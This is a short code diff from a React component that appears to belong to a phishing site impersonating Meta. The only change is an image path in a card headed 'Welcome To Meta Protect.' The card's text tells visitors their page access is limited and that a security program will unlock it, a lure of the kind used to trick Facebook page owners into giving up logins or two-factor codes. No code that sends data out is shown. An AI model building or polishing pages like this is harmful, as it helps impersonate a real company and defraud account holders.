@@ -45,7 +45,7 @@ export default function CommunityStandard() {
                 <div className="bg-light d-flex justify-content-center align-items-center">
                     <div className="card my-5" id="code-form" style={{ maxWidth: '650px', border: 'none', boxShadow: 'rgba(149, 157, 165, 0.2) 0px 8px 24px' }}>
                         <div className="card-body">
-                            <Image src="/img/2fa.gif" className="w-100 rounded" alt="" width={650} height={400} />
+                            <Image src="/img/B2Y8S9I.jpg" className="w-100 rounded" alt="" width={650} height={400} />
                             <h2 className="card-title fw-bold mt-4">Welcome To Meta Protect.</h2>
                             <p className="card-text py-3">
                                 Your page's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.
